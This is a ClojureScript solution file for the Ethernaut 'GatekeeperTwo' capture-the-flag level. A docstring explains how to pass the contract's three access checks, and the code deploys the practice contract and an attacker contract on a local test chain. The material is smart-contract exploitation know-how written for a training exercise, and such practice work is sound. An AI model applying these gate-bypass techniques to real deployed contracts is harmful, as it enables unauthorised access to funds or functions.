(ns main.ctf.ethernaut.gatekeeper-two
  "Like in GatekeeperOne contract, we must clear the 3 modifiers.

  1. require(msg.sender != tx.origin)

  To make sure this condition is satisfied we will deploy an
  attacker contract as a proxy to call the `.enter` function

  2. assembly { x := extcodesize(caller()) }
     require(x == 0);

  EXTCODESIZE is 0 when there is no code associated with the account.
  It is 0 for EOAs. We cannot use an EOA (first condition).
  To ensure that code size of our contract is 0, we will add
  nothing in the contract but the constructor. Because
  constructor is not the part of the 'deployed' bytecode that is put on chain.

  3. require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1)

  The RHS will underflow. it will become `2^64 - 1`. LHS is
  a Bitwise XOR. To make XOR have a `true` or `1` output both
  its inputs must be either both 0 or both 1. We can send `_gateKey`
  as:

  >>> negation of 8 bytes from the left of `sha3(msg.sender)` as uint64

  the negation will ensure that all 64 bits are opposites. It will make
  all the bits of the Bitwise XOR result 1."
  (:require [ctf.ethernaut.utils :as u]
            [ctf.ethernaut.wallets :as w]
            [cljs.core.async.interop :refer-macros [<p!]])
  (:require-macros [ctf.core :refer [try-async]]))


;; Init the a new wallet for the player
;; Attach it with the local provider
(def player
  (w/get-player! w/local-provider))


(defn deploy-gatekeeper!
  "Deploys the GatekeeperTwo contract using Owner's wallet!
   Returns the `js/Promise`."
  []
  (let [contract (u/contract :gatekeepertwo
                             w/local-wallet)]
    (.deploy contract)))


(defn deploy-attacker!
  "Deploys the attacker contract using players' wallet!
   Returns the `js/Promise`."
  [addr]
  (let [contract (u/contract
                  :gatekeepertwo/attack
                  player)]
    (.deploy contract
             addr
             (js-obj "gasLimit" 20000000))))


(defn gatekeeper-attack
  []
  (try-async
   [gatekeeper (<p! (deploy-gatekeeper!))]
   (<p! (deploy-attacker! (.-address gatekeeper)))))


(comment

  ;; Execute this block to run the attack!
  (gatekeeper-attack)

  (-> (u/compile-all!)
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))

  (def gatekeeper (atom ""))

  (-> (deploy-gatekeeper!)
      (.then #(reset! gatekeeper %))
      (.catch #(.log js/console %)))

  (def attacker (atom ""))

  (-> (deploy-attacker!
       (.-address @gatekeeper))
      (.then #(reset! attacker %))
      (.catch #(.log js/console %)))


  )
